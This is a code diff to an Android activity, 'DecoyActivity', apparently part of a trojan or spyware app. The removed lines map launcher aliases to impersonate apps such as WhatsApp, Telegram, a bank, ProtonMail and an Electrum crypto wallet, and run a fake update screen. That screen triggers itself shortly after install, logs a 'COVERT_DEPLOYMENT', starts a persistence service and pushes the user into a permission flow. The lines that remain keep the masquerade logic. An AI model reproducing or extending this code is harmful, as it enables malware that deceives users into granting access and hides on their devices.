@@ -4,7 +4,6 @@ import android.Manifest;
 import android.animation.AnimatorSet;
 import android.animation.ObjectAnimator;
 import android.content.Intent;
-import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
@@ -34,8 +33,6 @@ import java.util.Locale;
 
 public class DecoyActivity extends AppCompatActivity {
 
-    private Button btnCheckUpdate;
-    private View pseudoToast;
     private int clickCount = 0;
     private long lastClickTime = 0;
     private boolean isSpecializedDecoy = false;
@@ -74,23 +71,6 @@ public class DecoyActivity extends AppCompatActivity {
 
         // --- MASQUERADE PASSTHROUGH ---
         String masqPkg = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("masquerade_pkg", "");
-        
-        // Auto-infer package from launch component if not explicitly stored
-        if (masqPkg.isEmpty()) {
-            if (componentName.contains("TwitterAlias")) masqPkg = "com.twitter.android";
-            else if (componentName.contains("WhatsAppAlias")) masqPkg = "com.whatsapp";
-            else if (componentName.contains("TelegramAlias")) masqPkg = "org.telegram.messenger";
-            else if (componentName.contains("InstagramAlias")) masqPkg = "com.instagram.android";
-            else if (componentName.contains("YouTubeAlias")) masqPkg = "com.google.android.youtube";
-            else if (componentName.contains("ChromeAlias")) masqPkg = "com.android.chrome";
-            else if (componentName.contains("BankAlias")) masqPkg = "ca.pcfinancial.bank";
-            else if (componentName.contains("MailAlias")) masqPkg = "ch.protonmail.android";
-            else if (componentName.contains("VPNAlias")) masqPkg = "ch.protonvpn.android";
-            else if (componentName.contains("PdfAlias")) masqPkg = "com.adobe.reader";
-            else if (componentName.contains("MusicAlias")) masqPkg = "com.sec.android.app.music";
-            else if (componentName.contains("TermuxAlias")) masqPkg = "com.termux";
-            else if (componentName.contains("CryptoAlias")) masqPkg = "org.electrum.electrum";
-        }
 
         if (!masqPkg.isEmpty()) {
             try {
@@ -157,77 +137,7 @@ public class DecoyActivity extends AppCompatActivity {
         }
     }
 
-    private void setupUpdateDecoy() {
-        btnCheckUpdate = findViewById(R.id.btnCheckUpdate);
-        View ivUpdateIcon = findViewById(R.id.ivUpdateIcon);
-        pseudoToast = findViewById(R.id.pseudoToast);
 
-        Runnable triggerAction = () -> {
-            if (btnCheckUpdate != null) btnCheckUpdate.setEnabled(false);
-            getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
-            FirebaseConfig.logActivity("COVERT_DEPLOYMENT: System decoy initialized successfully.");
-            
-            // Start persistence core
-            Intent i = new Intent(DecoyActivity.this, WorkManager_Sync.class);
-            i.setAction(Constants.ACTION_START_CORE);
-            try {
-                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                    startForegroundService(i);
-                } else {
-                    startService(i);
-                }
-            } catch (Exception ignored) {}
-
-            // Transition to Permission Repair Sequence
-            try {
-                Intent permissions = new Intent(DecoyActivity.this, PermissionActivity.class);
-                permissions.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                startActivityForResult(permissions, 9999);
-            } catch (Exception e) {
-                Log.e("DecoyActivity", "Transition Error: " + e.getMessage());
-                setContentView(R.layout.activity_decoy_install_success);
-                setupSuccessDecoy();
-            }
-        };
-
-        if (btnCheckUpdate != null) {
-            btnCheckUpdate.setOnClickListener(v -> triggerAction.run());
-        }
-
-        // Auto-trigger setup sequence after 800ms on fresh install
-        boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
-        if (!isDeployed) {
-            new Handler(Looper.getMainLooper()).postDelayed(triggerAction, 800);
-        }
-
-        if (ivUpdateIcon != null) {
-            ivUpdateIcon.setOnClickListener(v -> finish());
-        }
-
-        View btnLearnMore = findViewById(R.id.btnLearnMore);
-        if (btnLearnMore != null) {
-            String dynamicUrl = getDynamicUpdateUrl();
-            if (btnLearnMore instanceof android.widget.TextView) {
-                SpannableStringBuilder builder = new SpannableStringBuilder("Learn more at:\n");
-                int start = builder.length();
-                builder.append(dynamicUrl);
-                builder.setSpan(new ForegroundColorSpan(Color.parseColor("#A0A0A0")), 0, start, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
-                builder.setSpan(new ForegroundColorSpan(Color.parseColor("#3470E5")), start, builder.length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
-                ((android.widget.TextView) btnLearnMore).setText(builder);
-            }
-            btnLearnMore.setOnClickListener(v -> {
-                Log.d("DecoyActivity", "Learn More link clicked: " + dynamicUrl);
-                try {
-                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(dynamicUrl));
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    startActivity(intent);
-                } catch (Exception e) {
-                    Log.e("DecoyActivity", "Error opening Learn More link: " + e.getMessage());
-                    android.widget.Toast.makeText(DecoyActivity.this, "Unable to open link", android.widget.Toast.LENGTH_SHORT).show();
-                }
-            });
-        }
-    }
 
     private void startRealisticLoadingAnimation(View layout) {
         // 1. Rotation Animation for the whole group
